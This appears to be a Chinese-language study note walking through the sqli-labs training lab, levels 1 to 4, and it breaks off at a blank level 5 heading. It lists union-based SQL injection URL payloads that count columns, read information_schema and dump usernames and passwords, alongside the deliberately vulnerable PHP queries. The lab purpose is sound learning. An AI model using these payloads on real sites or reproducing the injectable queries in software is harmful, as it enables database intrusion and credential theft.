# sql注入

## sqli-labs

直接通过靶场 [sqli-labs](https://github.com/juananpe/sqli-lab) （使用`Docker`构建）来学习。参考[详细sqli-labs（1-65）通关讲解](https://blog.csdn.net/dreamthe/article/details/123795302)

::: info mysql
该靶场使用`mysql`作为数据库，`mysql`数据库5.0以上版本自带一个叫 `information_schema` 的数据库，该数据库下面有两个表 `tables` 和 `columns` 。
其中 `tables` 里的 `table_name` 字段和 `table_schema` 字段存放了所有表以及表名所在的数据库名。
而 `columns` 里的 `column_name` 字段、 `table_name` 字段和 `table_schema` 字段存放了所有列名以及其所属的表名和数据库名。
:::

### less-1

- `http://localhost:8888/Less-1/?id=1'` 出现报错信息 `for the right syntax to use near ''1'' LIMIT 0,1' at line 1`

- `http://localhost:8888/Less-1/?id=1' order by 4 --+` 通过增加数字来确定表的列数

- `http://localhost:8888/Less-1/?id=-1'union select 1,2,3 --+` 爆出回显位

- `http://localhost:8888/Less-1/?id=-1'union select 1,database(),version() --+` 获取数据库名和版本号

- `http://localhost:8888/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+` 查询数据库`security`下的表名

- `http://localhost:8888/Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+` 查询表`users`下的列名

- `http://localhost:8888/Less-1/?id=-1'union select 1,group_concat(username),group_concat(password) from users --+` 查询表`users`内的用户名及密码

其后端 `sql` 查询语句 `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

### less-2

- `http://localhost:8888/Less-1/?id=1'` 出现报错信息 `for the right syntax to use near '' LIMIT 0,1' at line 1`
- `http://localhost:8888/Less-2/?id=2 order by 4`
- `http://localhost:8888/Less-2/?id=-1 union select 1,2,3`
- `http://localhost:8888/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users`

其后端 `sql` 查询语句 `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`

### less-3

- `http://localhost:8888/Less-3/?id=1'` 出现报错信息 `for the right syntax to use near ''1'') LIMIT 0,1' at line 1`
- `http://localhost:8888/Less-3/?id=1') order by 4 --+`
- `http://localhost:8888/Less-3/?id=-1') union select 1,2,3 --+`
- `http://localhost:8888/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users --+`

其后端 `sql` 查询语句 `$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`

### less-4

- `http://localhost:8888/Less-4/?id=1"` 出现报错信息 `for the right syntax to use near '"1"") LIMIT 0,1' at line 1`
- `http://localhost:8888/Less-4/?id=1") order by 4 --+`
- `http://localhost:8888/Less-4/?id=-1") union select 1,2,3 --+`
- `http://localhost:8888/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) from users --+`

其后端 `sql` 查询语句
```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

### less-5



